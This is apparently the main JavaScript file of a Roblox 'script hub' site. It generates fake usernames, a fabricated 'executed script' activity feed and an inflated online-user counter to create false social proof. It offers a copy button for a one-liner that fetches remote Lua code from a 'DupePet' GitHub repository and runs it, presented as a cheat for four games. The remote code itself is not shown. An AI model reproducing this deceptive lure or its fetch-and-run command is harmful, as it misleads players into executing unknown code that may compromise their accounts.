// =============================
// ⚡ YNhi Script - Main JS File
// =============================

// Fake user data
const users = [
  "ShadowNinja", "EpicGamer", "ScriptMaster", "CodeWizard", "PixelKing",
  "ByteLord", "RobloxPro", "LuaExpert", "GameHacker", "VirtualHero",
  "DarkKnight", "TechSavvy", "ScriptSlinger", "DigitalDragon", "CyberSamurai",
  "VoidWalker", "NightStalker", "CodeBreaker", "GameChanger", "ScriptKing"
];

const games = [
  { id: "gag", name: "Grow A Garden", icon: "fa-seedling", color: "success", 
    code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/ZysumeDupePet/ZymuseScript/refs/heads/main/UpdateZysume"))()` },
  { id: "pet", name: "Pet Simulator", icon: "fa-gem", color: "warning", 
    code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/ZysumeDupePet/ZymuseScript/refs/heads/main/UpdateZysume"))()` },
  { id: "adopt", name: "Adopt Me", icon: "fa-dog", color: "info", 
    code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/ZysumeDupePet/ZymuseScript/refs/heads/main/UpdateZysume"))()` },
  { id: "mm2", name: "Murder Mystery 2", icon: "fa-skull", color: "danger", 
    code: `loadstring(game:HttpGet("https://raw.githubusercontent.com/ZysumeDupePet/ZymuseScript/refs/heads/main/UpdateZysume"))()` }
];

// Execution counter
let executionCount = 0;
const executionList = document.getElementById('executions-list');
const executionCounter = document.getElementById('execution-count');

// Online counter
let onlineCount = 1238;
let onlineCountElement = document.getElementById('online-count');

// Function to update online count
function updateOnlineUsers() {
  const isAdding = Math.random() > 0.3;
  const changeAmount = Math.floor(Math.random() * 8) + 1;

  let newCount = onlineCount + (isAdding ? changeAmount : -changeAmount);
  if (newCount < 1200) newCount = 1200 + Math.floor(Math.random() * 50);

  onlineCount = newCount;
  onlineCountElement.textContent = onlineCount.toLocaleString();

  onlineCountElement.classList.add('fade-in');
  setTimeout(() => {
    onlineCountElement.classList.remove('fade-in');
  }, 400);
}

// Create fake execution
function createFakeExecution() {
  const user = users[Math.floor(Math.random() * users.length)];
  const game = games[Math.floor(Math.random() * games.length)];
  const minutesAgo = Math.floor(Math.random() * 10) + 1;
  const timeStr = formatTimeAgo(minutesAgo);

  const activityItem = document.createElement('div');
  activityItem.className = 'activity-item fade-in';

  const activityAvatar = document.createElement('div');
  activityAvatar.className = 'activity-avatar';
  activityAvatar.textContent = user.charAt(0);

  const activityDetails = document.createElement('div');
  activityDetails.className = 'activity-details';

  const activityUser = document.createElement('div');
  activityUser.className = 'activity-user';
  activityUser.textContent = user;

  const activityAction = document.createElement('div');
  activityAction.className = 'activity-action';

  const activityText = document.createElement('span');
  activityText.textContent = 'executed script in';

  const activityGame = document.createElement('span');
  activityGame.className = 'activity-game';
  activityGame.innerHTML = `<i class="fas ${game.icon}"></i> ${game.name}`;

  const activityTime = document.createElement('span');
  activityTime.className = 'activity-time';
  activityTime.textContent = timeStr;

  activityAction.appendChild(activityText);
  activityAction.appendChild(activityGame);
  activityAction.appendChild(activityTime);

  activityDetails.appendChild(activityUser);
  activityDetails.appendChild(activityAction);

  activityItem.appendChild(activityAvatar);
  activityItem.appendChild(activityDetails);

  if (executionList.firstChild) {
    executionList.insertBefore(activityItem, executionList.firstChild);
  } else {
    executionList.appendChild(activityItem);
  }

  executionCount++;
  executionCounter.textContent = `${executionCount.toLocaleString()} Today`;

  if (executionList.children.length > 8) {
    executionList.removeChild(executionList.lastChild);
  }

  setTimeout(() => {
    activityItem.classList.remove('fade-in');
  }, 400);
}

// Format time ago
function formatTimeAgo(minutes) {
  return minutes === 1 ? '1 min ago' : `${minutes} mins ago`;
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
  for (let i = 0; i < 5; i++) {
    setTimeout(() => createFakeExecution(), i * 300);
  }

  setInterval(createFakeExecution, 8000);
  setInterval(updateOnlineUsers, 5000);

  // Copy button
  document.querySelectorAll('.copy-btn').forEach(button => {
    button.addEventListener('click', () => {
      const codeBlock = button.closest('.code-block');
      const code = codeBlock.querySelector('pre').textContent;

      navigator.clipboard.writeText(code).then(() => {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copied!';
        setTimeout(() => { button.innerHTML = originalText; }, 2000);
      });
    });
  });

  // Tabs
  const tabs = document.querySelectorAll('.tab');
  const gameCards = document.querySelectorAll('.game-card');

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');

      const gameId = tab.getAttribute('data-game');
      gameCards.forEach(card => {
        if (card.getAttribute('data-game') === gameId) {
          card.style.display = 'block';
          card.classList.add('fade-in');
          setTimeout(() => card.classList.remove('fade-in'), 400);
        } else {
          card.style.display = 'none';
        }
      });
    });
  });

  tabs[0].click();
});
